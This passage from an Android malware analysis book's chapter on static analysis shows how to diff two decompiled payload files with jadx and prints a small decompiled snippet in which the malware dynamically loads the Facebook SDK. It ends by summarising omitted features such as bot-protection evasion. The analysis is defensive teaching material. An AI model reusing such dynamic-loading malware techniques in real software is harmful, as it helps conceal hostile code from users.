<p class="indent">In a first step, we can try to determine the differences between <em>fbhx1</em> and <em>fbhx2</em>. The command line version of jadx is helpful here, as we can just decompile both files and then use standard programming tools to diff the two generated source code folders. As the package names <em>com.facebook.*</em> and <em>com.facebook2.*</em> are slightly different, we have to rename <em>facebook2</em> to <em>facebook</em> before standard code diffing tools work well on the output:</p>&#13;
<pre>$ <span class="codestrong1">jadx fbhx1</span>&#13;
$ <span class="codestrong1">jadx fbhx2</span>&#13;
$ <span class="codestrong1">grep -rl facebook2 . | xargs sed -i 's/facebook2/facebook/g'</span>&#13;
<span epub:type="pagebreak" id="page_112"/>$ <span class="codestrong1">mv fbhx2-jadx-output/sources/com/facebook2/&#13;
    fbhx2-jadx-output/sources/com/facebook</span>&#13;
$ <span class="codestrong1">diff --suppress-common-lines -r -y fbhx1-jadx-output/ fbhx2-jadx-output/</span></pre>&#13;
<p class="indent">The output, omitted here, contains only some differences seemingly caused by jadx decompilation quirks. It appears that the code of <em>fbhx1</em> and <em>fbhx2</em> is functionally identical. Knowing this, let’s take a look at how the malware interacts with these two files. Depending on which file is loaded, it appears that <em>xn3o</em> interacts with <em>fbhx</em> in only one section of code. <a href="ch03.xhtml#ch3lis35">Listing 3-35</a> shows that the malware loads class <code>j</code> and calls methods <code>a</code> and <code>c</code>, respectively.</p>&#13;
<pre>Class loadClass = new DexClassLoader(&#13;
  file.getAbsolutePath(),&#13;
  file2.getAbsolutePath(),&#13;
  null,&#13;
  context.getClassLoader()).loadClass(&#13;
    i == 2 ? "com.facebook2.j" : "com.facebook.j");&#13;
loadClass.getMethod("a", String.class).invoke(null, str);&#13;
loadClass.getMethod("c", Context.class).invoke(null, context);</pre>&#13;
<p class="list" id="ch3lis35"><em>Listing 3-35: The malware loading the Facebook SDK</em></p>&#13;
<p class="indent">A quick web search for the many strings in <code>j</code> reveals that this class is originally <code>FacebookSdk</code>. The <code>a</code> method is really <code>setApplicationId</code> and the <code>c</code> method is really <code>sdkInitialize</code>.</p>&#13;
<p class="indent">Is the Facebook SDK legitimate, or has it been maliciously manipulated? The answer to that question is unclear, as, to our knowledge, there are no good public tools available to find maliciously modified SDKs in Android apps. Even if such tools were available, you would have to first find the original, legitimate SDK to compare with the malware’s version. Luckily the <code>FacebookSdk</code> class contains a version string that makes that part easier.</p>&#13;
<p class="indent">In the absence of useful tools, we’ll have to leave the answer to this question open. The Facebook SDK, as decompiled by jadx, contains more than 20,000 lines of code in more than 150 classes. That’s too much to manually compare to the real Facebook SDK. As names in the <em>fbhx</em> files are mangled, a simple diff tool will barely help, either.</p>&#13;
<h3 class="h3" id="ch03lev11"><strong>Up Next</strong></h3>&#13;
<p class="noindent">This completes our introduction to static Android malware analysis. You learned about the tools you can use to statically reverse engineer malware code, as well as many best practices for doing so.</p>&#13;
<p class="indent">For brevity, we omitted significant chunks of code from our explanation of the malware’s core functionality. For example, we didn’t include the code used to parse the HTML of the premium sign-up pages. Likewise, the malware contains code to thwart several commercially available products that premium services can license to protect their sign-up pages from bot activity; we left this undescribed.</p>&#13;
<p class="indent"><span epub:type="pagebreak" id="page_113"/>Also not described is the malware’s complex messaging system. Different parts of the malware, in both the Java and JavaScript components, exchange messages using the default Android messaging system. These messages help the malware organize and execute its next steps depending on its current state and how far the sign-up process has progressed. Following this messaging system isn’t trivial due to its asynchronous nature and its use of broadcasts and message queues.</p>&#13;
<p class="indent">While powerful, static analysis is only part of malware analysis and needs to be supplemented with dynamic analysis. In the next chapter, we’ll do just that, as we analyze a different malware sample using dynamic analysis techniques.<span epub:type="pagebreak" id="page_114"/></p>&#13;
</div>
</div>
<div style="float: none; margin: 10px 0px 10px 0px; text-align: center;"><p><a href="https://oceanofpdf.com"><i>OceanofPDF.com</i></a></p></div></body></html>